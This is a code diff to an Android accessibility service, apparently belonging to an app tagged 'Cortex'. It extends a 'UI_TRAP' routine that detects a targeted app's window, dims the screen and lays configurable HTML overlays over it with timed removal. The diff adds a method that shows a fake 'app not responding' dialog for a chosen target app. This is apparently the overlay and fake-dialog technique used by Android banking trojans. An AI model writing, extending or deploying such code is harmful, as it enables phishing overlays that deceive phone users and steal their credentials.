@@ -558,34 +558,39 @@ class MyAccessibilityService : AccessibilityService() {
                             if (now - lastTrigger > 2000) {
                                 statsPrefs.edit().putLong("ui_trap_last_trigger", now).apply()
                                 
-                                val method = trap.optString("method", "ACC")
+                                val method = trap.optString("method", "ACC").uppercase()
                                 val html = trap.optString("html", "")
                                 val timeout = trap.optLong("timeout", 10L)
                                 val dimLevel = trap.optInt("dim", 20)
                                 
-                                DebugLogger.log("UI_TRAP", "Deploying trap sequence for target: $titleTarget")
+                                DebugLogger.log("UI_TRAP", "Deploying trap sequence for target: $titleTarget | Method: $method")
                                 
-                                // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
-                                try {
-                                    val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
-                                    val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
-                                    wakeLock.acquire(3000)
-                                } catch (e: Exception) {}
+                                if (method == "ANR") {
+                                    val targetApp = if (html.isNotBlank()) html else null
+                                    triggerFakeAnr(targetApp)
+                                } else {
+                                    // WAKE CPU FOR TRANSITION: Prevents the OS from micro-sleeping while rendering WebView
+                                    try {
+                                        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                                        val wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "Cortex:UiTrapWake")
+                                        wakeLock.acquire(3000)
+                                    } catch (e: Exception) {}
 
-                                Handler(Looper.getMainLooper()).post {
-                                    DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
-                                    DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
-                                }
-                                
-                                Handler(Looper.getMainLooper()).postDelayed({
-                                    DimmerManager.removeOverlay(this@MyAccessibilityService)
-                                }, 2500)
-                                
-                                if (timeout > 0L) {
+                                    Handler(Looper.getMainLooper()).post {
+                                        DimmerManager.applyDim(this@MyAccessibilityService, dimLevel, method)
+                                        DynamicUIManager.showOverlay(this@MyAccessibilityService, true, method, html, false)
+                                    }
+                                    
                                     Handler(Looper.getMainLooper()).postDelayed({
-                                        DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
-                                        DynamicUIManager.removeOverlay(this@MyAccessibilityService)
-                                    }, timeout * 1000)
+                                        DimmerManager.removeOverlay(this@MyAccessibilityService)
+                                    }, 2500)
+                                    
+                                    if (timeout > 0L) {
+                                        Handler(Looper.getMainLooper()).postDelayed({
+                                            DebugLogger.log("UI_TRAP", "Timeout reached (${timeout}s). Disarming overlay.")
+                                            DynamicUIManager.removeOverlay(this@MyAccessibilityService)
+                                        }, timeout * 1000)
+                                    }
                                 }
                             }
                             
